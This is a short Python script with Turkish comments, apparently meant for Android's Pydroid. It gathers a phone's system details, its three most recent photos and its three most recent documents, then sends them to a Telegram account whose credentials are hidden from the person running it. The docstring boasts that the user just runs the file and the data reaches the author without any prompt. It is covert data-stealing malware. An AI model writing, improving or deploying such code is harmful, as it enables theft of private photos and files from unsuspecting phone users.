"""
KULLANIMI ÇOK BASİT:
Kullanıcı sadece bu dosyayı çalıştırır, 
hiçbir şey sormadan direkt sana gelir!
"""
from phone_data_collector import DataCollector, TelegramSender, PermissionManager

def main():
    print("📱 Telefon verileri toplanıyor...")
    
    # 1. İzin kontrolü
    perm = PermissionManager()
    if not perm.check_permissions():
        print("İzin isteniyor...")
        if not perm.request_storage_permission():
            print("❌ İzin verilmedi!")
            return
    
    # 2. Veri topla
    collector = DataCollector()
    
    # Sistem bilgisi
    sistem = collector.get_system_info()
    
    # Son 3 fotoğraf
    fotograflar = collector.collect_photos(max_count=3)
    
    # Son 3 döküman
    dokumanlar = collector.collect_documents(max_count=3)
    
    # 3. Telegram'a gönder (Hesap bilgileri gizli, direkt sana gelir)
    print("📤 Veriler gönderiliyor...")
    tg = TelegramSender()  # DİKKAT: Hiçbir bilgi girmiyor!
    
    # Özet mesaj
    ozet = f"""
📱 <b>YENİ VERİ ALINDI!</b>

🖥 Cihaz: {sistem['device']}
📸 Fotoğraf: {len(fotograflar)}
📄 Döküman: {len(dokumanlar)}
⏱ Zaman: {sistem['time']}

#pydroid #veri
    """
    tg.send_message(ozet)
    
    # Fotoğrafları gönder
    for foto in fotograflar:
        tg.send_photo(foto['path'], f"📸 {foto['name']}")
    
    # Dökümanları gönder
    for dok in dokumanlar:
        tg.send_file(dok['path'], f"📄 {dok['name']}")
    
    print("✅ Tamamlandı! Veriler sana ulaştı.")

if __name__ == "__main__":
    main()
